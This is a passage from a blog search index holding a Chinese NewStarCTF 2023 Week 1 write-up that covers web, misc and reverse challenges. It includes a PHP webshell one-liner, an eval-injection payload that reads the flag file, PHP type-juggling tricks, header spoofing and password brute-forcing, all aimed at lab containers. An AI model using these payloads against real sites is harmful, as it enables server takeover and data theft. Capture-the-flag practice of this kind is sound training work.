<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NewStarCTF 2023-WEEK1 WriteUp</title>
      <link href="/2023/09/26/2023newstarctfWeek1/"/>
      <url>/2023/09/26/2023newstarctfWeek1/</url>
      
        <content type="html"><![CDATA[<p>好久没碰ctf了，感觉手有点生，正好最近newstar新生赛，过来凑个热闹。</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>解题 7&#x2F;7</p><h3 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h3><p>介绍里面写了“粗心的网站管理员总会泄漏一些敏感信息在Web根目录下”，一眼信息泄露</p><p>打开容器，出现<code>粗心的管理员泄漏了一些敏感信息，请你找出他泄漏的两个敏感信息！</code>，&#x2F;robots.txt一试直接爆出flag的前半段，&#x2F;<a href="http://www.zip直接把源码泄露了./">www.zip直接把源码泄露了。</a></p><p>拿到flag：<code>flag&#123;r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous&#125;</code></p><h3 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h3><p>一眼文件上传，写一个php马试一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>发现文件后缀有白名单，但是验证是在前端，直接burp抓包改一下文件名就能绕</p><h3 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h3><p>打开容器，发现要求请使用 GET方式 来给 ctf 参数传入任意值来通过这关</p><p>加个参数试一下<code>http://node4.buuoj.cn:25055/?ctf=1</code></p><p>发现<code>很棒，如果我还想让你以POST方式来给我传递 secret 参数你又该如何处理呢？ 如果你传入的参数值并不是我想要的secret，我也不会放你过关的 或许你可以找一找我把secret藏在了哪里</code></p><p>ctrl+U看下源码，发现注释<code>&lt;!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) --&gt;</code></p><p>base64解码一下，得到secret是n3wst4rCTF2023g00000d</p><p>HackBar插件传一下POST参数</p><p>接下来发现<code>很强，现在我需要验证你的 power 是否是 ctfer ，只有ctfer可以通过这关</code></p><p>Cookie改一下power改为ctfer</p><p>发现<code>你已经完成了本题过半的关卡，现在请使用 NewStarCTF2023浏览器 来通过这关！</code></p><p>把User-Agent改为NewStarCTF2023</p><p>发现<code>希望你是从 newstarctf.com 访问到这个关卡的</code></p><p>加个Referer: <code>newstarctf.com</code> </p><p>最后发现<code>最后一关了！只有 本地用户 可以通过这一关</code></p><p>加一个Header：<code>X-Real-IP: 127.0.0.1</code>，本来以为这道题是要加X-Forwarded-For，结果加X-Forwarded-For发现好像不太行</p><p>拿到flag：<code>flag&#123;221fb558-9c0a-4b07-bac6-3af03cf7393e&#125;</code></p><h3 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h3><p>这道题有点奇怪，看到flask以为是SSTI，结果打开容器随便传个<code>number1=&#123;&#123;&#125;&#125;</code>，发现DEBUG模式没关，结果flag直接写到源代码里直接能看见，直接拿到flag：<code>flag&#123;Y0u_@re_3enset1ve_4bout_deb8g&#125;</code></p><h3 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h3><p>上来容器直接给出代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 1=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$flag1</span> = True;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 2=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$flag2</span> = True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag2</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 3=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>],<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>)) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$flag3</span> = True;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 3&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag3</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 4=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>] &gt; <span class="number">2023</span>)&#123;</span><br><span class="line">            <span class="variable">$flag4</span> = True;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 4&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag4</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 5=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$var</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$var</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$flag5</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看level1，要保证<code>$_GET[&#39;key1&#39;] !== $_GET[&#39;key2&#39;] &amp;&amp; md5($_GET[&#39;key1&#39;]) == md5($_GET[&#39;key2&#39;])</code>为 True，发现md5直接的判断是&#x3D;&#x3D;而不是&#x3D;&#x3D;&#x3D;，直接0e碰撞即可，随便找两个<code>240610708</code>和<code>QLTHNDT</code>就行。</p><p>再看level2，保证<code>md5($_POST[&#39;key3&#39;]) === sha1($_POST[&#39;key3&#39;]</code>为 True，中间是&#x3D;&#x3D;&#x3D;，没办法再用level1的0e碰撞了，这里一个小技巧直接POST传<code>key3[]=</code>即可，这里key3直接被识别成数组了，导致两个函数都返回false。</p><p>接下来level3，保证<code>strcmp($_GET[&#39;key4&#39;],file_get_contents(&quot;/flag&quot;)) == 0</code>为 True，继续用<code>key4[]=</code>，用数组的方式让其返回false</p><p>然后level4，保证<code>!is_numeric($_GET[&#39;key5&#39;]) &amp;&amp; $_GET[&#39;key5&#39;] &gt; 2023</code>为 True，传<code>key5=2024a</code>，当它与2023比较时就会比它大，而且还识别不出它是数字。</p><p>最后level5，要保证它不能全是字母和数字，还要保证flag5变量是True，POST传<code>flag5=-</code>即可。</p><p>拿到flag：<code>flag&#123;35c5a11f-c06d-4178-9fb8-b4f97d3e9796&#125;</code></p><h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h3><p>打开容器，贴上代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$password</span>,<span class="number">0</span>,<span class="number">6</span>)===<span class="string">&quot;c4d038&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要保证password的md5前6位是<code>c4d038</code>，同时code中不能含有一些敏感的单词。</p><p>这里贴上我跑MD5的脚本，写的不好，但是勉强能跑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要遍历的字符集</span></span><br><span class="line">characters = string.digits + string.ascii_letters</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_combinations</span>(<span class="params">length</span>):</span><br><span class="line">    <span class="keyword">for</span> combo <span class="keyword">in</span> itertools.product(characters, repeat=length):</span><br><span class="line">        <span class="keyword">yield</span> <span class="string">&#x27;&#x27;</span>.join(combo)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_md5</span>(<span class="params">string</span>):</span><br><span class="line">    md5_hash = hashlib.md5()  <span class="comment"># 创建MD5对象</span></span><br><span class="line">    md5_hash.update(string.encode())  <span class="comment"># 更新对象哈希值</span></span><br><span class="line">    md5_digest = md5_hash.hexdigest()  <span class="comment"># 获取哈希值的十六进制表示</span></span><br><span class="line">    <span class="keyword">return</span> md5_digest</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_md5_match</span>(<span class="params">prefix</span>):</span><br><span class="line">    <span class="keyword">for</span> combo <span class="keyword">in</span> generate_combinations(<span class="built_in">len</span>(prefix)):</span><br><span class="line">        string = prefix + combo</span><br><span class="line">        md5 = calculate_md5(string)</span><br><span class="line">        <span class="keyword">if</span> md5[<span class="number">0</span>:<span class="number">6</span>] == <span class="string">&#x27;c4d038&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;string&#125;</span>   MD5哈希值: <span class="subst">&#123;md5&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试计算MD5</span></span><br><span class="line">input_string = <span class="string">&quot;0&quot;</span></span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):  <span class="comment"># 根据实际情况设置线程数量</span></span><br><span class="line">    prefix = input_string * i</span><br><span class="line">    thread = threading.Thread(target=find_md5_match, args=(prefix,))</span><br><span class="line">    threads.append(thread)</span><br><span class="line">    thread.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">    thread.join()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;input_string&#125;</span>dddMD5哈希值: <span class="subst">&#123;md5&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>随便跑出来一个<code>0000006sNj</code></p><p>接着直接传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e[v.a.l=<span class="keyword">echo</span> `cat /f*`</span><br></pre></td></tr></table></figure><p>这里注意要用[代替_，这算是一个php特性。</p><h3 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h3><p>打开容器，看到一个登录注册页面，拿burp抓包，最开始以为是sql注入，但是注入发现提示不是注入。</p><p>随便注册一个账号admin1，登录后发现是一个静态的shell，javascript代码审计一下，发现</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;echo -en &#x27;\\nnewstar\\nnewstar2023&#x27; &gt;&gt; weak-passwd.txt &amp;&amp; \\\nexport PASSWORD=`shuf weak-passwd.txt | head -n 1` &amp;&amp; \\\nrm -rf weak-passwd.txt&quot;</span>),<span class="title function_">applyAutoComplete</span>(le),<span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">800</span>),term.<span class="title function_">writeln</span>(<span class="variable constant_">WELCOME_TEXT</span>),<span class="title function_">readInput</span>(),le.<span class="title function_">detach</span>(),<span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">200</span>),le.<span class="title function_">attach</span>(),le.<span class="title function_">pushInput</span>(<span class="string">&quot;chat&quot;</span>),le.<span class="title function_">confirm</span>(),<span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">200</span>),le.<span class="title function_">pushInput</span>(<span class="string">&quot;你会说中文吗？&quot;</span>)</span><br></pre></td></tr></table></figure><p>提示weak-passwd.txt弱口令，再加上注册时发现admin用户已经被注册，使用burp直接爆破密码。</p><img src="/2023/09/26/2023newstarctfWeek1/burp.png" class=""><p>发现admin弱口令是000000</p><p>登录，并拦截返回包，javascript审计，发现提示</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;echo Maybe you need BurpSuite.&quot;</span></span><br></pre></td></tr></table></figure><p>清除cookie重新登录，拦截passport的返回包，得到flag：<code>flag&#123;97222ac1-f6d3-49c1-b1e6-05778420cfe2&#125;</code></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>解题 5&#x2F;6</p><h3 id="CyberChef’s-Secret"><a href="#CyberChef’s-Secret" class="headerlink" title="CyberChef’s Secret"></a>CyberChef’s Secret</h3><p>签到题，打开后看到<code>M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA=</code>，进入cyberchef.org，一把梭，拿到flag：<code>flag&#123;Base_15_S0_Easy_^_^&#125;</code>。</p><h3 id="机密图片"><a href="#机密图片" class="headerlink" title="机密图片"></a>机密图片</h3><p>zsteg工具</p><p>执行<code>zsteg secret.png</code>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">b1,r,lsb,xy         .. text: &quot;:=z^rzwPQb&quot;</span><br><span class="line">b1,g,lsb,xy         .. file: OpenPGP Public Key</span><br><span class="line">b1,b,lsb,xy         .. file: OpenPGP Secret Key</span><br><span class="line">b1,rgb,lsb,xy       .. text: &quot;flag&#123;W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece&#125;&quot;</span><br><span class="line">b3,b,lsb,xy         .. file: very old 16-bit-int big-endian archive</span><br><span class="line">b4,bgr,msb,xy       .. file: MPEG ADTS, layer I, v2, 112 kbps, 24 kHz, JntStereo</span><br></pre></td></tr></table></figure><p>拿到flag：<code>flag&#123;W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece&#125;</code></p><h3 id="流量！鲨鱼！"><a href="#流量！鲨鱼！" class="headerlink" title="流量！鲨鱼！"></a>流量！鲨鱼！</h3><p>wireshark打开发现流量<code>1.php%3fcmd=ls%20-al%20</code>内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">total 80</span><br><span class="line">drwxr-xr-x   1 root root 4096 Aug 19 06:17 .</span><br><span class="line">drwxr-xr-x   1 root root 4096 Aug 19 06:17 ..</span><br><span class="line">-rwxr-xr-x   1 root root    0 Aug 19 06:08 .dockerenv</span><br><span class="line">-rw-r--r--   1 root root   39 Aug 19 06:17 .ffffllllllll11111144444GGGGGG</span><br><span class="line">drwxr-xr-x   1 root root 4096 Dec 21  2021 bin</span><br><span class="line">drwxr-xr-x   2 root root 4096 Dec 11  2021 boot</span><br><span class="line">drwxr-xr-x   5 root root  360 Aug 19 06:08 dev</span><br><span class="line">drwxr-xr-x   1 root root 4096 Aug 19 06:08 etc</span><br><span class="line">drwxr-xr-x   2 root root 4096 Dec 11  2021 home</span><br><span class="line">drwxr-xr-x   1 root root 4096 Dec 21  2021 lib</span><br><span class="line">drwxr-xr-x   2 root root 4096 Dec 20  2021 lib64</span><br><span class="line">drwxr-xr-x   2 root root 4096 Dec 20  2021 media</span><br><span class="line">drwxr-xr-x   2 root root 4096 Dec 20  2021 mnt</span><br><span class="line">drwxr-xr-x   2 root root 4096 Dec 20  2021 opt</span><br><span class="line">dr-xr-xr-x 248 root root    0 Aug 19 06:08 proc</span><br><span class="line">drwx------   1 root root 4096 Aug 19 06:17 root</span><br><span class="line">drwxr-xr-x   1 root root 4096 Dec 21  2021 run</span><br><span class="line">drwxr-xr-x   1 root root 4096 Dec 21  2021 sbin</span><br><span class="line">drwxr-xr-x   2 root root 4096 Dec 20  2021 srv</span><br><span class="line">dr-xr-xr-x  13 root root    0 Aug 19 06:08 sys</span><br><span class="line">drwxrwxrwt   1 root root 4096 Dec 21  2021 tmp</span><br><span class="line">drwxr-xr-x   1 root root 4096 Dec 20  2021 usr</span><br><span class="line">drwxr-xr-x   1 root root 4096 Dec 21  2021 var</span><br></pre></td></tr></table></figure><p>发现啊flag名字<code>.ffffllllllll11111144444GGGGGG</code></p><p>启动过滤器<code>frame contains ffffllllllll11111144444GGGGGG</code>，追踪HTTP流，看到flag的两次base64编码：<code>Wm14aFozdFhjbWt6TldnMGNtdGZNWE5mZFRVelpuVnNYMkkzTW1FMk1EazFNemRsTm4wSwo=</code>，base64解密两次得到：<code>flag&#123;Wri35h4rk_1s_u53ful_b72a609537e6&#125;</code></p><h3 id="压缩包们"><a href="#压缩包们" class="headerlink" title="压缩包们"></a>压缩包们</h3><p>下载后发现打不开</p><p>使用binwalk，<code>binwalk -e task_1 </code>，得到一个压缩包，bandizip打开发现base64编码的注释<code>SSBsaWtlIHNpeC1kaWdpdCBudW1iZXJzIGJlY2F1c2UgdGhleSBhcmUgdmVyeSBjb25jaXNlIGFuZCBlYXN5IHRvIHJlbWVtYmVyLg==</code>，base64解密后得到<code>I like six-digit numbers because they are very concise and easy to remember.</code>，拿爆破工具直接爆破密码，得到232311，拿到flag：<code>flag&#123;y0u_ar3_the_m4ter_of_z1111ppp_606a4adc&#125;</code></p><h3 id="空白格"><a href="#空白格" class="headerlink" title="空白格"></a>空白格</h3><p>下载后发现都是空格、Tab和换行，联想到WhiteSpace语言，在网上随便找一个WhiteSpace在线运行环境<a href="https://www.w3cschool.cn/tryrun/runcode?lang=whitespace">whitespace在线运行,在线工具，在线编译IDE_w3cschool</a>，运行得到flag：<code>flag&#123;w3_h4v3_to0_m4ny_wh1t3_sp4ce_2a5b4e04&#125;</code></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>解题 7&#x2F;8</p><h3 id="easy-RE"><a href="#easy-RE" class="headerlink" title="easy_RE"></a>easy_RE</h3><p>下载程序，拖到ida里面打开，能看见flag的前半部分<code>flag&#123;we1c0m</code></p><img src="/2023/09/26/2023newstarctfWeek1/re1_up.png" class=""><p>F5反编译，看到后半部分<code>e_to_rev3rse!!&#125;</code>，得到完整flag：<code>flag&#123;we1c0me_to_rev3rse!!&#125;</code></p><h3 id="咳"><a href="#咳" class="headerlink" title="咳"></a>咳</h3><p>Upx脱壳<code>upx -d KE.exe</code></p><p>反编译代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// kr00_8</span></span><br><span class="line">  <span class="type">char</span> Str1[<span class="number">96</span>]; <span class="comment">// [rsp+20h] [rbp-88h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+80h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  <span class="built_in">memset</span>(Str1, <span class="number">0</span>, <span class="keyword">sizeof</span>(Str1));</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  Hello();</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>i64; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = &amp;Str1[<span class="built_in">strlen</span>(Str1)];</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v4 - Str1 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++Str1[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(Str1, enc, v4 - Str1) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;WOW!!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I believe you can do it!&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中enc是<code>gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~</code>，</p><p>写一个python脚本解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&#x27;gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">1</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到flag：<code>flag&#123;C0ngratu1at10ns0nPa221ngTheF1rstPZGALAXY1eve1&#125;</code></p><h3 id="Segments"><a href="#Segments" class="headerlink" title="Segments"></a>Segments</h3><p>下载附件，拖到ida里，提示shift+F7，直接按，发现段名字中藏着flag</p><img 